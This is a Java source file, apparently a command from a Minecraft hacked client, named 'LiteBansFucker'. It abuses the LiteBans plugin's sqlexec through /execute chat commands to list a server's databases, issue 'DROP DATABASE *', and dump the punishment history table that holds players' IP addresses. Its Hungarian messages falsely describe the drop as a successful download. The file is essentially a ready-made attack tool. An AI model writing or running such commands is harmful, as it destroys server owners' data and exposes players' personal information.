package DTool.command.impl;

import DTool.command.*;
import Mood.*;
import net.minecraft.client.*;

public class LiteBansFucker extends Command
{
    public LiteBansFucker() {
        super("LiteBansFucker", "LiteBansFucker", "LiteBansFucker", new String[] { "LiteBansFucker" });
    }
    
    @Override
    public void onCommand(final String[] array, final String s) {
        if (array.length < 1) {
            Segito.msg("§7Haszn\u00e1lat:§b -litebansfucker <database/givedatabases/giveipaddress>");
            return;
        }
        if (array[0].equalsIgnoreCase("database")) {
            Minecraft.thePlayer.sendChatMessage("/execute Player 0 0 0 litebans sqlexec SHOW DATABASES");
            Segito.msg("§7Itt is lenn\u00e9nek az adatb\u00e1zisok!");
        }
        if (array[0].equalsIgnoreCase("givedatabases")) {
            Minecraft.thePlayer.sendChatMessage("/execute Player 0 0 0 litebans sqlexec DROP DATABASE *");
            Segito.msg("§7Az adatb\u00e1zisok sikeresen le lettek k\u00e9rve!");
        }
        if (array[0].equalsIgnoreCase("giveipaddress")) {
            Minecraft.thePlayer.sendChatMessage("/execute Player 0 0 0 litebans sqlexec select * from {HISTORY}");
            Segito.msg("§7Bro... That's§b Illegal§7.");
        }
    }
}
